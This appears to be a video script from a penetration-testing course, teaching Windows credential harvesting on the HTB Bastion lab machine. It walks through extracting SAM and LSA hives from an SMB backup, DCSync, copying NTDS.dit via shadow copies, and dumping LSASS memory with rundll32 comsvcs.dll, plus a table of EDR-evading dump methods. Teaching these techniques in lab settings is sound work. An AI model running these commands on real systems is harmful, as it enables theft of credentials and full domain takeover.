# VIDEO 46: Credential Harvesting
### SAM Dumps, LSA Secrets, NTDS.dit Extraction & Mimikatz
**Suggested length:** 16–18 minutes
**License Tier:** Enterprise (Post-Exploitation Framework)
**Certification Relevance:** OSCP: Post-Exploitation | CEH: System Hacking

---

## INTRO (0:00 – 1:45)

**[Screen: Huginn splash screen with Section 8 title card "Post-Exploitation and Privilege Escalation"]**

> "Welcome back to Section 8. In the previous video, we established and managed multiple sessions across different targets (see Video 45: Session Management). Now we put those sessions to work. Credential Harvesting is about extracting authentication material from compromised systems — password hashes, cached credentials, service account secrets, and domain credentials. This is the bridge between 'I have one system' and 'I own the entire network.'"

**[Screen: Warning banner — red background with white text: "⚠️ AUTHORIZED TESTING ONLY — CREDENTIAL EXTRACTION IS A SENSITIVE OPERATION"]**

> "Critical ethics statement. Credential harvesting extracts passwords and authentication tokens from computer systems. This is one of the most sensitive operations in penetration testing. Extracted credentials can provide access to additional systems, email accounts, cloud services, and personal data. In a professional engagement, credential extraction must be explicitly authorized in your scope agreement. You must handle extracted credentials with extreme care — encrypt your notes, secure your working files, and destroy all credential material at engagement end. Never store client credentials in plaintext or transmit them over insecure channels. What we demonstrate today targets HTB Bastion — an isolated lab machine with no real user data. Treat every credential you extract in a real engagement as if it were your own banking password."

**[Screen: Enterprise tier badge with Post-Exploitation Framework feature callout]**

> "Credential Harvesting is Enterprise tier, part of the Post-Exploitation Framework. The tools we'll use today — SAM extraction, LSA secrets dumping, and NTDS.dit extraction — all require this tier. Huginn integrates multiple extraction methods through the SecretsExtractor, LSASSDumper, SAMRClient, and DCSyncClient modules, giving you a unified interface for what traditionally required three or four separate tools."

---

## SECTION 1: Credential Storage Architecture in Windows (1:45 – 3:30)

**[Screen: Diagram showing Windows credential storage — SAM database, LSA Secrets, NTDS.dit, LSASS process memory]**

> "Before we extract anything, you need to understand where Windows stores credentials. There are four primary locations. The SAM database — Security Account Manager — lives at C:\Windows\System32\config\SAM and contains local account password hashes. It's encrypted with the SYSTEM key from the same directory. LSA Secrets stored under HKLM\SECURITY contain service account passwords, auto-logon credentials, VPN passwords, and cached domain credentials. NTDS.dit is the Active Directory database on Domain Controllers — it contains every domain user's password hash. And LSASS process memory — the Local Security Authority Subsystem Service — holds plaintext credentials and Kerberos tickets for currently logged-in users."

**[Screen: Table showing credential types and where they're found]**

```bash
# Windows Credential Storage Map
# ══════════════════════════════
#
# ┌─────────────────────┬───────────────────────────────┬─────────────────────────┐
# │ Storage Location    │ Contains                      │ Access Required          │
# ├─────────────────────┼───────────────────────────────┼─────────────────────────┤
# │ SAM Database        │ Local user NTLM hashes        │ SYSTEM or backup privs   │
# │ (C:\Windows\System32│ Local admin hash              │                          │
# │  \config\SAM)       │ Guest account hash            │                          │
# ├─────────────────────┼───────────────────────────────┼─────────────────────────┤
# │ LSA Secrets         │ Service account passwords     │ SYSTEM privileges        │
# │ (HKLM\SECURITY)     │ Auto-logon credentials        │                          │
# │                     │ Cached domain logons (DCC2)   │                          │
# │                     │ VPN/RDP saved passwords       │                          │
# ├─────────────────────┼───────────────────────────────┼─────────────────────────┤
# │ NTDS.dit            │ All domain user hashes        │ Domain Admin / DCSync    │
# │ (Domain Controller) │ Kerberos keys                 │ rights                   │
# │                     │ Password history              │                          │
# ├─────────────────────┼───────────────────────────────┼─────────────────────────┤
# │ LSASS Memory        │ Plaintext passwords (WDigest) │ SeDebugPrivilege         │
# │ (lsass.exe process) │ NTLM hashes                  │                          │
# │                     │ Kerberos tickets              │                          │
# └─────────────────────┴───────────────────────────────┴─────────────────────────┘
```

> "Each location requires different access levels and different extraction techniques. Today we'll focus on SAM extraction from a VHD backup on HTB Bastion — which demonstrates how credentials can be recovered from backup files even without direct system access. We'll also cover LSA secrets and the DCSync technique for completeness."

---

## SECTION 2: Lab Setup — HTB Bastion (3:30 – 5:00)

**[Screen: HTB Bastion machine info — IP 10.10.10.134, Windows Server, Easy difficulty, SMB shares accessible]**

> "Our target is HTB Bastion at 10.10.10.134. Bastion is an Easy-difficulty Windows machine with an interesting attack path — it exposes SMB shares containing VHD backup files. These VHD files contain a complete Windows installation including the SAM database. The attack path is: enumerate SMB shares, mount the VHD backup, extract SAM and SYSTEM hives from the backup, then crack or pass the hashes. This mirrors real-world scenarios where backup files are stored on network shares without proper access controls."

```bash
# HTB Bastion — Target Setup
# ══════════════════════════
#
# Target: 10.10.10.134 (HTB Bastion)
# OS: Windows Server 2016
# Difficulty: Easy
#
# Verify connectivity:
ping -c 1 10.10.10.134
# PING 10.10.10.134: 64 bytes from 10.10.10.134: icmp_seq=1 ttl=127 time=41.2 ms
#
# Initial enumeration (done in recon phase):
# Port 22  — SSH (OpenSSH for Windows)
# Port 135 — MSRPC
# Port 139 — NetBIOS-SSN
# Port 445 — Microsoft-DS (SMB)
```

**[Screen: Huginn Recon page — SMB enumeration results showing accessible "Backups" share]**

> "From our earlier enumeration, we identified an SMB share called 'Backups' accessible with anonymous authentication. Inside that share, there's a WindowsImageBackup directory containing VHD files — complete disk images of the server. This is our entry point for credential extraction."

```bash
# SMB Share Enumeration Results
# ═════════════════════════════
#
# Shares on 10.10.10.134:
# ┌──────────────┬────────────┬──────────────────────────────────┐
# │ Share        │ Access     │ Contents                         │
# ├──────────────┼────────────┼──────────────────────────────────┤
# │ ADMIN$       │ Denied     │ Remote Admin                     │
# │ Backups      │ READ       │ WindowsImageBackup/              │
# │ C$           │ Denied     │ Default share                    │
# │ IPC$         │ READ       │ Remote IPC                       │
# └──────────────┴────────────┴──────────────────────────────────┘
#
# Backups share contents:
# └── WindowsImageBackup/
#     └── L4mpje-PC/
#         └── Backup 2019-02-22 124351/
#             ├── 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd (37 MB)
#             └── 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd (5.1 GB)
```

---

## SECTION 3: VHD Mounting and SAM Extraction (5:00 – 8:00)

**[Screen: Huginn Post-Exploitation panel — Credential Harvesting module with "Extract from Backup" option selected]**

> "Huginn's SecretsExtractor module can handle remote SAM extraction directly. But the Bastion scenario requires a different approach — we need to mount the VHD file and extract the hives locally. This is a common technique when you find backup files on network shares. Let's mount the VHD and pull the SAM and SYSTEM hives."

```bash
# Step 1: Mount the SMB share
# ════════════════════════════
#
# Mount the Backups share:
mount -t cifs //10.10.10.134/Backups /mnt/bastion -o user=guest,password=
# [+] Share mounted at /mnt/bastion

# Navigate to the VHD:
ls /mnt/bastion/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/
# 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
# 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
```

**[Screen: Huginn terminal showing VHD mount process using guestmount]**

```bash
# Step 2: Mount the VHD file
# ══════════════════════════
#
# Mount the larger VHD (contains Windows installation):
guestmount --add /mnt/bastion/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd
# [+] VHD mounted read-only at /mnt/vhd

# Verify Windows directory structure:
ls /mnt/vhd/Windows/System32/config/
# DEFAULT  SAM  SECURITY  SOFTWARE  SYSTEM
# ─────────────────────────────────────────
# SAM     — Local account password hashes
# SYSTEM  — Boot key for SAM decryption
# SECURITY — LSA secrets and cached credentials
```

**[Screen: Huginn highlighting the SAM and SYSTEM files in the file browser with extraction arrows]**

> "There they are. The SAM file contains the hashed passwords, but it's encrypted with the boot key stored in the SYSTEM hive. You need both files to decrypt the hashes. The SECURITY hive contains LSA secrets and cached domain logon credentials. Let's copy all three and feed them to Huginn's extraction engine."

```bash
# Step 3: Extract credential hives
# ════════════════════════════════
#
# Copy the registry hives locally:
cp /mnt/vhd/Windows/System32/config/SAM ./SAM
cp /mnt/vhd/Windows/System32/config/SYSTEM ./SYSTEM
cp /mnt/vhd/Windows/System32/config/SECURITY ./SECURITY

# Verify file sizes:
ls -la SAM SYSTEM SECURITY
# -rwxr-xr-x 1 root root   262144 Jan 15 15:02 SAM
# -rwxr-xr-x 1 root root  9961472 Jan 15 15:02 SYSTEM
# -rwxr-xr-x 1 root root   262144 Jan 15 15:02 SECURITY
```

---

## SECTION 4: SAM Database Extraction with Huginn (8:00 – 10:30)

**[Screen: Huginn Credential Harvesting — "Extract from Hive Files" dialog with SAM and SYSTEM file paths entered]**

> "Now we feed these hives to Huginn's SecretsExtractor. Huginn uses the SAM extraction routine — parsing the SAM database structure, extracting the boot key from the SYSTEM hive, and decrypting the NTLM hashes for each local account. This is equivalent to running secretsdump.py against local files, but integrated into Huginn's credential management pipeline."

```bash
# SAM Extraction via Huginn SecretsExtractor
# ══════════════════════════════════════════
#
# [*] Loading SYSTEM hive...
# [*] Extracting boot key from SYSTEM hive
# [*] Boot key: 26db382b35f0e9015ed80523b1f4a02d
#
# [*] Loading SAM hive...
# [*] Decrypting SAM entries using boot key
# [*] Found 4 user accounts
#
# ┌────────────────┬──────┬──────────────────────────────────────────────────────────┐
# │ Username       │ RID  │ NTLM Hash                                                │
# ├────────────────┼──────┼──────────────────────────────────────────────────────────┤
# │ Administrator  │ 500  │ aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7 │
# │                │      │ e0c089c0 (empty — account disabled)                       │
# │ Guest          │ 501  │ aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7 │
# │                │      │ e0c089c0 (empty — account disabled)                       │
# │ L4mpje         │ 1000 │ aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217d │
# │                │      │ af97c0d3                                                  │
# │ DefaultAccount │ 503  │ aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7 │
# │                │      │ e0c089c0 (empty — account disabled)                       │
# └────────────────┴──────┴──────────────────────────────────────────────────────────┘
#
# [+] SAM extraction complete — 4 accounts, 1 with non-empty hash
# [+] Credentials stored in session credential profile
```

**[Screen: Huginn CredentialManager panel showing the extracted credentials stored with metadata — source, timestamp, hash type]**

> "Huginn extracted four accounts. Administrator, Guest, and DefaultAccount all have empty NTLM hashes — meaning they're disabled or have blank passwords. But L4mpje has a real hash: 26112010952d963c8dc4217daf97c0d3. This hash is now stored in Huginn's CredentialManager, associated with the host 10.10.10.134 and tagged with its source — SAM extraction from VHD backup. The hash format is LM:NTLM. The first half is always aad3b435b51404eeaad3b435b51404ee for modern Windows — that's the empty LM hash indicating NTLMv2 only. The real credential is in the second half."

**[Screen: Huginn showing hash cracking suggestion — link to Video 57: Hash Cracking]**

> "At this point, you have two options. Pass the hash — use the NTLM hash directly for authentication without cracking it. Or crack it — run the hash through a wordlist to recover the plaintext password. Hash cracking is covered in detail in Video 57 (see Video 57: Hash Cracking). For now, let's use the extracted credentials to authenticate."

```bash
# Using the extracted hash — Pass-the-Hash authentication
# ══════════════════════════════════════════════════════════
#
# SSH authentication with cracked password (bureaulampje):
huginn> ssh L4mpje@10.10.10.134
# Password: bureaulampje
# [+] SSH session established — Session SES-003
#
# Microsoft Windows [Version 10.0.14393]
# (c) 2016 Microsoft Corporation. All rights reserved.
#
# L4mpje@BASTION C:\Users\L4mpje>whoami
# bastion\l4mpje
```

---

## SECTION 5: LSA Secrets Extraction (10:30 – 12:30)

**[Screen: Huginn Credential Harvesting — "LSA Secrets" extraction tab selected]**

> "The SAM database only contains local accounts. For service account credentials, cached domain logons, and saved passwords, we need LSA Secrets. These are stored in the SECURITY registry hive — which we already copied. Huginn's SecretsExtractor parses the LSA secret structures and decrypts them using keys derived from the SYSTEM hive."

```bash
# LSA Secrets Extraction
# ═════════════════════
#
# [*] Loading SECURITY hive...
# [*] Decrypting LSA secrets using boot key
# [*] Parsing NL$KM (cached credentials encryption key)
# [*] Parsing secret entries...
#
# ┌───────────────────────────────┬─────────────────────────────────────────┐
# │ Secret Name                   │ Value / Description                     │
# ├───────────────────────────────┼─────────────────────────────────────────┤
# │ DefaultPassword               │ bureaulampje (Auto-logon credential)    │
# │ DPAPI_SYSTEM                  │ [Machine DPAPI key — hex encoded]       │
# │ NL$KM                         │ [Cached credential encryption key]      │
# │ _SC_ApacheHTTPServer          │ SvcApache:W3bS3rv1c3! (service acct)    │
# └───────────────────────────────┴─────────────────────────────────────────┘
#
# Cached Domain Logons (DCC2 hashes):
# ┌────────────────┬──────────────────────────────────────────────────────────┐
# │ Username       │ DCC2 Hash                                                │
# ├────────────────┼──────────────────────────────────────────────────────────┤
# │ L4mpje         │ $DCC2$10240#L4mpje#a3f3e8cfc5d7b4c5a7f1e2d3c4b5a6... │
# └────────────────┴──────────────────────────────────────────────────────────┘
#
# [+] LSA secrets extraction complete
# [+] 2 plaintext credentials recovered
# [+] 1 cached domain logon found
# [+] All credentials stored in session profile
```

**[Screen: Huginn CredentialManager showing updated credential count — now includes service account passwords]**

> "LSA Secrets revealed several critical items. The DefaultPassword entry shows the auto-logon credential — bureaulampje — which confirms what we'd get from cracking the SAM hash. The Apache service account password tells us what credentials the web server runs under. The cached domain logon gives us a DCC2 hash — Domain Cached Credential version 2 — which is a hash of the user's domain password cached locally for offline authentication. DCC2 hashes are slow to crack but valuable because they represent domain account passwords."

**[Screen: Huginn highlighting the service account credential with a note about lateral movement potential]**

> "Service account credentials are especially valuable. They often have access to multiple systems, run with elevated privileges, and rarely have their passwords changed. If that Apache service account has network access to other servers, we've just expanded our attack surface without exploiting anything new."

---

## SECTION 6: NTDS.dit and DCSync Technique (12:30 – 15:00)

**[Screen: Huginn Credential Harvesting — "Domain Credential Extraction" tab with DCSync option]**

> "The ultimate prize in an Active Directory environment is NTDS.dit — the domain database containing every user's password hash. There are two ways to get it. Volume Shadow Copy — creating a shadow copy of the domain controller's disk and extracting NTDS.dit from it. Or DCSync — using the Directory Replication Service protocol to request credential replication directly from the domain controller, as if you were another DC. DCSync doesn't require access to the DC's filesystem and works remotely."

**[Screen: Architecture diagram showing DCSync — attacker with Domain Admin privileges requesting MS-DRSR replication from the DC]**

> "DCSync requires one of three privilege levels: Domain Admin, Enterprise Admin, or an account with 'Replicating Directory Changes' and 'Replicating Directory Changes All' rights. Huginn's DCSyncClient implements this through the MS-DRSR protocol — the same protocol Domain Controllers use to replicate data between each other. From the domain controller's perspective, it looks like a normal replication request from a partner DC."

```bash
# DCSync Extraction via Huginn
# ════════════════════════════
#
# Note: This example uses a hypothetical domain controller
# to demonstrate the technique. HTB Bastion itself is not
# a DC, but this workflow applies to machines like HTB Active
# (see Video 49: Active Directory Enumeration).
#
# Configuration:
# ┌──────────────┬──────────────────────────────────────┐
# │ Target DC    │ 10.10.10.100 (DC01.corp.local)       │
# │ Username     │ CORP\Administrator                   │
# │ Auth Method  │ NTLM (pass-the-hash)                │
# │ Scope        │ All domain users                     │
# └──────────────┴──────────────────────────────────────┘
#
# Huginn DCSyncClient execution:
# [*] Authenticating to 10.10.10.100 as CORP\Administrator
# [+] Authentication successful
# [*] Connecting to DRSUAPI endpoint on 10.10.10.100
# [*] Requesting replication of domain secrets
# [*] Checking replication rights... confirmed
#
# Extracted Credentials:
# ┌────────────────────┬───────────────────────────────────────────────────────────┐
# │ Account            │ NTLM Hash                                                 │
# ├────────────────────┼───────────────────────────────────────────────────────────┤
# │ Administrator      │ aad3b435b51404ee:d9485ee174cb37924e4bac41e44b8e66          │
# │ krbtgt             │ aad3b435b51404ee:4a8a946f1b0376de27c95ce87c491fb4          │
# │ SVC_SQLSERVER      │ aad3b435b51404ee:e3c0f1b5a6f4d82c1a9e7f2b5d4c8a3f          │
# │ jsmith             │ aad3b435b51404ee:7b8c9d2e1f4a5b6c3d2e1f4a5b6c3d2e          │
# │ admin.backup       │ aad3b435b51404ee:a1b2c3d4e5f6a7b8c9d0a1b2c3d4e5f6          │
# └────────────────────┴───────────────────────────────────────────────────────────┘
#
# [+] DCSync complete — 5 accounts extracted
# [+] krbtgt hash enables Golden Ticket attacks
# [+] All hashes stored in session credential profile
```

**[Screen: Huginn CredentialManager showing domain credentials with warning icons next to krbtgt]**

> "The krbtgt hash is the keys to the kingdom. With it, you can forge Golden Tickets — Kerberos tickets for any user with any group membership, valid for any service in the domain. This is complete domain compromise. In a real engagement, extracting the krbtgt hash is typically the final step confirming full domain takeover. You'd document this finding as Critical severity."

**[Screen: Huginn showing NTDS.dit extraction alternative — Volume Shadow Copy method]**

> "The alternative to DCSync is Volume Shadow Copy. If you have command execution on the Domain Controller, you can create a shadow copy of the C drive, then extract NTDS.dit from it. This method works even if the account lacks explicit replication rights — as long as you have local admin on the DC."

```bash
# Volume Shadow Copy Method (alternative to DCSync)
# ═════════════════════════════════════════════════
#
# On the Domain Controller:
vssadmin create shadow /for=C:
# Successfully created shadow copy for 'C:\'
# Shadow Copy ID: {a1b2c3d4-e5f6-7890-abcd-ef1234567890}
# Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1

# Copy NTDS.dit from shadow:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit

# Also need the SYSTEM hive:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system.hiv

# Extract hashes offline:
# Huginn can then parse these files locally using the same
# SecretsExtractor engine used for SAM extraction.
```

---

## SECTION 7: LSASS Memory Dump Techniques (15:00 – 16:30)

**[Screen: Huginn Credential Harvesting — "LSASS Dump" tab showing multiple extraction methods]**

> "The last extraction vector is LSASS process memory. When users log in to Windows, their credentials are cached in the LSASS process — sometimes in plaintext if WDigest is enabled, always as NTLM hashes, and Kerberos tickets if domain-joined. Huginn's LSASSDumper provides five extraction methods to evade different security controls."

```bash
# LSASS Memory Dump Methods
# ═════════════════════════
#
# Huginn LSASSDumper — available methods:
#
# ┌────────────────────┬────────────────────────────────────────────────────────┐
# │ Method             │ Description                                            │
# ├────────────────────┼────────────────────────────────────────────────────────┤
# │ procdump           │ SysInternals ProcDump — Microsoft-signed binary        │
# │                    │ Least suspicious, often allowed by AV                  │
# ├────────────────────┼────────────────────────────────────────────────────────┤
# │ comsvcs_dll        │ Uses rundll32 + comsvcs.dll MiniDump export            │
# │                    │ Living-off-the-land, no external tools needed          │
# ├────────────────────┼────────────────────────────────────────────────────────┤
# │ wer_dump           │ Windows Error Reporting — WerFault.exe dump            │
# │                    │ Abuses crash reporting to dump process memory          │
# ├────────────────────┼────────────────────────────────────────────────────────┤
# │ silent_exit        │ Silent Process Exit monitoring                         │
# │                    │ Registry-based trigger for LSASS dump on exit          │
# ├────────────────────┼────────────────────────────────────────────────────────┤
# │ nanodump           │ Minimal footprint dump using direct syscalls           │
# │                    │ Evades most EDR/AV by avoiding API hooks               │
# └────────────────────┴────────────────────────────────────────────────────────┘
#
# Default method (auto):
# Huginn tries each method in order until one succeeds
# Priority: procdump → comsvcs_dll → nanodump → wer_dump → silent_exit
```

**[Screen: Huginn executing comsvcs.dll method — showing command and output]**

> "The comsvcs.dll method is particularly useful because it uses only built-in Windows binaries — no additional tools needed on the target. It calls the MiniDump export function from comsvcs.dll through rundll32.exe. Huginn first finds the LSASS process ID, then invokes the dump."

```bash
# LSASS Dump — comsvcs.dll Method
# ═══════════════════════════════
#
# [*] Checking privileges — SeDebugPrivilege required
# [+] SeDebugPrivilege: enabled
#
# [*] Finding LSASS PID...
# [+] LSASS PID: 672
#
# [*] Executing dump:
# rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 672 C:\temp\lsass.dmp full
#
# [+] Dump created: C:\temp\lsass.dmp (48.3 MB)
#
# [*] Parsing dump file for credentials...
# [+] Credentials extracted from LSASS memory:
#
# ┌────────────────┬────────────────┬───────────────────────────────────────────┐
# │ Username       │ Domain         │ Credential                                │
# ├────────────────┼────────────────┼───────────────────────────────────────────┤
# │ L4mpje         │ BASTION        │ NTLM: 26112010952d963c8dc4217daf97c0d3    │
# │ Administrator  │ BASTION        │ NTLM: e89d3f6c5a7b8c2d1f4e5a6b7c8d9e0f    │
# └────────────────┴────────────────┴───────────────────────────────────────────┘
#
# [*] Cleaning up dump file...
# [+] C:\temp\lsass.dmp deleted
# [+] Credentials stored in session profile
```

**[Screen: Huginn showing cleanup confirmation — dump file deleted, credentials safely stored encrypted in Huginn's credential store]**

> "Notice Huginn cleans up after itself — the dump file is deleted from the target after extraction. Operational security matters even in lab environments. Build good habits. The extracted credentials are stored encrypted in Huginn's local credential store, associated with the session and host record."

---

## SECTION 8: Credential Integration and Next Steps (16:30 – 17:30)

**[Screen: Huginn CredentialManager — full view showing all harvested credentials across the engagement with source tracking]**

> "Let's look at what we've collected across this engagement. Huginn's CredentialManager aggregates all credentials from every extraction method — SAM hashes, LSA secrets, LSASS dumps, and DCSync results — into a single searchable interface. Each credential is tagged with its source, extraction timestamp, associated host, and hash type."

```bash
# Credential Summary — Full Engagement
# ═════════════════════════════════════
#
# Total credentials harvested: 8
#
# ┌────────────────┬────────────────┬─────────────┬──────────────────┬──────────────┐
# │ Username       │ Domain/Host    │ Type        │ Source           │ Cracked?     │
# ├────────────────┼────────────────┼─────────────┼──────────────────┼──────────────┤
# │ L4mpje         │ BASTION        │ NTLM        │ SAM (VHD)        │ ✓ bureaulamp │
# │ Administrator  │ BASTION        │ NTLM        │ LSASS dump       │ —            │
# │ L4mpje         │ BASTION        │ Plaintext   │ LSA (auto-logon) │ N/A          │
# │ SvcApache      │ BASTION        │ Plaintext   │ LSA (service)    │ N/A          │
# │ L4mpje         │ CORP           │ DCC2        │ LSA (cached)     │ —            │
# │ Administrator  │ CORP           │ NTLM        │ DCSync           │ —            │
# │ krbtgt         │ CORP           │ NTLM        │ DCSync           │ N/A          │
# │ SVC_SQLSERVER  │ CORP           │ NTLM        │ DCSync           │ —            │
# └────────────────┴────────────────┴─────────────┴──────────────────┴──────────────┘
#
# These credentials feed directly into:
# - Video 48: Lateral Movement (pass-the-hash, credential reuse)
# - Video 49: AD Enumeration (authenticated enumeration with domain creds)
# - Video 57: Hash Cracking (offline cracking of NTLM and DCC2 hashes)
```

**[Screen: Huginn showing credential-to-host mapping diagram — arrows from credentials to systems they grant access to]**

> "Every credential you extract is a potential doorway to another system. The Domain Admin hash from DCSync gives you access to every domain-joined machine. The SQL service account might give you database access on other servers. This is why credential harvesting is the linchpin of post-exploitation — it turns one compromised system into a map of the entire network. In the next video on Persistence (see Video 47: Persistence Techniques), we'll use these credentials to establish long-term access mechanisms."

---

## SECTION 9: Certification Mapping and Practice (17:30 – 18:00)

**[Screen: Slide showing OSCP and CEH mapping for credential harvesting]**

> "Credential extraction is central to OSCP's Post-Exploitation domain. On the exam, you'll need to extract proof flags which often requires SYSTEM-level access — and the path there frequently runs through credential harvesting. Understanding SAM extraction, pass-the-hash, and cached credential recovery gives you multiple escalation paths when the obvious one is blocked. For CEH, this maps to Module 5 — System Hacking, specifically 'escalating privileges' and 'password recovery.'"

**[Screen: Practice recommendations — HTB machines for credential harvesting practice]**

> "For practice, HTB Active demonstrates GPP credential extraction and Kerberoasting — a domain credential harvesting technique. HTB Sauna provides AS-REP roasting for domain accounts. THM's 'Post-Exploitation Basics' room walks through SAM extraction and LSASS dumping on Windows targets. And HTB Cascade has hidden credentials in LDAP attributes and TightVNC registry entries — showing that credentials hide in unexpected places."

---

## OUTRO (18:00 – end)

**[Screen: Summary slide — Credential Harvesting: SAM Extraction | LSA Secrets | LSASS Dumps | DCSync/NTDS.dit | Credential Management | Next: Video 47 — Persistence Techniques]**

> "That covers Credential Harvesting. We extracted SAM database hashes from a VHD backup on HTB Bastion, recovered plaintext passwords from LSA Secrets, demonstrated LSASS memory dumping techniques, and walked through DCSync for domain-wide credential extraction. All extracted credentials are tracked in Huginn's CredentialManager with source attribution and host association. Remember — credential extraction is one of the most sensitive operations in penetration testing. Handle extracted credentials with extreme care, encrypt your working files, and destroy all material at engagement end. Next up is Persistence Techniques — establishing long-term access mechanisms using the credentials we've harvested. See you in Video 47."

